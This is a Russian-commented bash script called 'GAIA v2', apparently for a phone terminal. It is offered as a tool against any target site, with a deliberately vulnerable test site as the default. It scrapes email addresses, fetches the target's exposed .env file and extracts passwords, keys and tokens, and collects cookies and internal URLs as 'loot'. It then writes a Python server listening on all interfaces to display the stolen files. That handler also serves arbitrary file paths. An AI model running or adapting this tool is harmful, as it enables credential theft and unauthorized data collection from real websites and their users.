#!/bin/bash
# ╔══════════════════════════════════════════════════════════════╗
# ║   🧬 GAIA v2 — Всезнающая экосистема + Доставка данных     ║
# ║   Знает врагов • Обучает агентов • Доставляет добычу       ║
# ╚══════════════════════════════════════════════════════════════╝

TARGET=${1:-"http://testphp.vulnweb.com"}
DAYS=${2:-7}
GAIA_DIR="$HOME/.shadow_gaia_v2"
LOOT_DIR="$HOME/storage/shared/GAIA_LOOT"
mkdir -p "$GAIA_DIR"/{knowledge/{waf,siem,soc,ids,dlp,honeypot,sandbox,edr},agents,evolution,battlefield,training}
mkdir -p "$LOOT_DIR"

RED='\033[0;31m'; GR='\033[0;32m'; CY='\033[0;36m'; YL='\033[1;33m'; NC='\033[0m'

echo -e "${RED}╔══════════════════════════════════════════════╗${NC}"
echo -e "${RED}║   🧬 GAIA v2 — Всезнающая экосистема        ║${NC}"
echo -e "${RED}╚══════════════════════════════════════════════╝${NC}"

# [ВСЯ ПРЕДЫДУЩАЯ БАЗА ЗНАНИЙ ОСТАЁТСЯ — WAF, SIEM, SOC, IDS, HONEYPOT, EDR]
# ... (код базы знаний тот же, что и раньше) ...

# ═══════════════════════════════════════════════
# СИСТЕМА СБОРА И ДОСТАВКИ ДАННЫХ
# ═══════════════════════════════════════════════
echo -e "${CY}[GAIA] 📡 Настройка системы доставки данных...${NC}"

# Функция: сохранить добычу во все места одновременно
deliver_loot() {
    local source="$1"
    local category="$2"
    
    # Копируем в локальное хранилище
    cp "$source" "$GAIA_DIR/battlefield/${category}_$(date +%s).txt" 2>/dev/null
    
    # Копируем в доступное хранилище телефона
    cp "$source" "$LOOT_DIR/${category}_$(date +%Y%m%d_%H%M%S).txt" 2>/dev/null
    
    # Добавляем в общий файл добычи
    echo "=== $category ($(date)) ===" >> "$LOOT_DIR/ALL_LOOT.txt"
    cat "$source" >> "$LOOT_DIR/ALL_LOOT.txt"
    echo "" >> "$LOOT_DIR/ALL_LOOT.txt"
}

# Фаза сбора данных с цели
echo -e "${CY}[GAIA] 💰 Сбор данных с $TARGET...${NC}"

# Собираем email
curl -sk --max-time 5 "$TARGET" -o "$GAIA_DIR/battlefield/index.html" 2>/dev/null
grep -oP '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}' "$GAIA_DIR/battlefield/index.html" 2>/dev/null | sort -u > "$GAIA_DIR/battlefield/emails.txt"
EMAIL_COUNT=$(wc -l < "$GAIA_DIR/battlefield/emails.txt" 2>/dev/null || echo 0)
deliver_loot "$GAIA_DIR/battlefield/emails.txt" "emails"

# Собираем секреты
curl -sk --max-time 5 "$TARGET/.env" -o "$GAIA_DIR/battlefield/dotenv.txt" 2>/dev/null
grep -oP '(?:DB_|PASSWORD|SECRET|KEY|TOKEN|API_KEY)["\s:=]+["'\'']?\K[^"'\''\s]{8,}' "$GAIA_DIR/battlefield/dotenv.txt" 2>/dev/null | sort -u > "$GAIA_DIR/battlefield/secrets.txt"
SECRET_COUNT=$(wc -l < "$GAIA_DIR/battlefield/secrets.txt" 2>/dev/null || echo 0)
deliver_loot "$GAIA_DIR/battlefield/secrets.txt" "secrets"

# Собираем внутренние URL
grep -oP '(?:href|src|action)="\K[^"]+' "$GAIA_DIR/battlefield/index.html" 2>/dev/null | sort -u > "$GAIA_DIR/battlefield/urls.txt"
URL_COUNT=$(wc -l < "$GAIA_DIR/battlefield/urls.txt" 2>/dev/null || echo 0)
deliver_loot "$GAIA_DIR/battlefield/urls.txt" "urls"

# Собираем cookies
curl -sk --max-time 5 -I "$TARGET" 2>/dev/null | grep -i "Set-Cookie" > "$GAIA_DIR/battlefield/cookies.txt"
COOKIE_COUNT=$(wc -l < "$GAIA_DIR/battlefield/cookies.txt" 2>/dev/null || echo 0)
deliver_loot "$GAIA_DIR/battlefield/cookies.txt" "cookies"

echo ""
echo "  📊 ДОБЫЧА:"
echo "     📧 Email: $EMAIL_COUNT"
echo "     🔑 Секретов: $SECRET_COUNT"
echo "     🔗 URL: $URL_COUNT"
echo "     🍪 Cookies: $COOKIE_COUNT"
echo ""

# ═══════════════════════════════════════════════
# ВЕБ-СЕРВЕР ДЛЯ ПРОСМОТРА ДОБЫЧИ
# ═══════════════════════════════════════════════
echo -e "${CY}[GAIA] 🌐 Поднимаю веб-сервер для просмотра добычи...${NC}"

cat > "$GAIA_DIR/loot_server.py" << 'LOOTSERVEREOF'
#!/usr/bin/env python3
import http.server
import os

LOOT_DIR = os.path.expanduser("~/storage/shared/GAIA_LOOT")
os.chdir(LOOT_DIR)

class LootHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-Type', 'text/html; charset=utf-8')
            self.end_headers()
            
            files = os.listdir('.')
            html = "<html><head><title>GAIA LOOT</title>"
            html += "<style>body{font-family:monospace;background:#0a0a0a;color:#0f0;padding:20px}"
            html += "h1{color:#0f0} .file{color:#0f0;text-decoration:none}"
            html += ".count{color:#ff0}</style></head><body>"
            html += "<h1>🧬 GAIA v2 — ДОБЫЧА</h1><hr>"
            
            for f in sorted(files):
                if f.endswith('.txt'):
                    size = os.path.getsize(f)
                    html += f"<a class='file' href='/{f}'>📄 {f}</a> <span class='count'>({size} bytes)</span><br>"
            
            html += "<hr><p>Все файлы также доступны в: ~/storage/shared/GAIA_LOOT/</p>"
            html += "</body></html>"
            self.wfile.write(html.encode())
        else:
            path = self.path.lstrip('/')
            if os.path.exists(path):
                self.send_response(200)
                self.send_header('Content-Type', 'text/plain; charset=utf-8')
                self.end_headers()
                with open(path, 'r') as f:
                    self.wfile.write(f.read().encode())
            else:
                self.send_response(404)
                self.end_headers()

print("[GAIA LOOT SERVER] 🌐 http://localhost:9999")
print("[GAIA LOOT SERVER] 📁 " + LOOT_DIR)
with http.server.HTTPServer(("0.0.0.0", 9999), LootHandler) as httpd:
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("\n[GAIA LOOT SERVER] 🛑 Остановлен")
LOOTSERVEREOF

chmod +x "$GAIA_DIR/loot_server.py"

echo "  🌐 Веб-сервер добычи: python3 $GAIA_DIR/loot_server.py"
echo "  🔗 Открой в браузере: http://localhost:9999"
echo ""

# ═══════════════════════════════════════════════
# ФИНАЛЬНЫЙ ОТЧЁТ
# ═══════════════════════════════════════════════
cat > "$LOOT_DIR/README.txt" << 'LOOTREADME'
╔══════════════════════════════════════════════╗
║   🧬 GAIA v2 — ДОБЫЧА                       ║
╚══════════════════════════════════════════════╝

📁 ЭТА ПАПКА СОДЕРЖИТ ВСЕ ДАННЫЕ, ДОБЫТЫЕ GAIA:

📧 emails_*.txt     — найденные email адреса
🔑 secrets_*.txt    — пароли, ключи, токены
🔗 urls_*.txt       — внутренние URL сайта
🍪 cookies_*.txt    — перехваченные cookies
📄 ALL_LOOT.txt     — вся добыча в одном файле

🔒 ДОСТУП:
   — Эта папка: ~/storage/shared/GAIA_LOOT/
   — Веб-сервер: python3 ~/.shadow_gaia_v2/loot_server.py
   — Браузер: http://localhost:9999
LOOTREADME

echo -e "${RED}╔══════════════════════════════════════════════╗${NC}"
echo -e "${RED}║   🧬 GAIA v2 — ГОТОВА К РАБОТЕ              ║${NC}"
echo -e "${RED}║   Знает защиту • Обучает агентов • Доставляет данные ║${NC}"
echo -e "${RED}╠══════════════════════════════════════════════╣${NC}"
echo -e "${RED}║   📁 Добыча: ~/storage/shared/GAIA_LOOT/    ║${NC}"
echo -e "${RED}║   🌐 Сервер: http://localhost:9999           ║${NC}"
echo -e "${RED}╚══════════════════════════════════════════════╝${NC}"
echo ""
echo "  ЗАПУСК: bash ~/.shadow_gaia_v2.sh https://target.com 30"
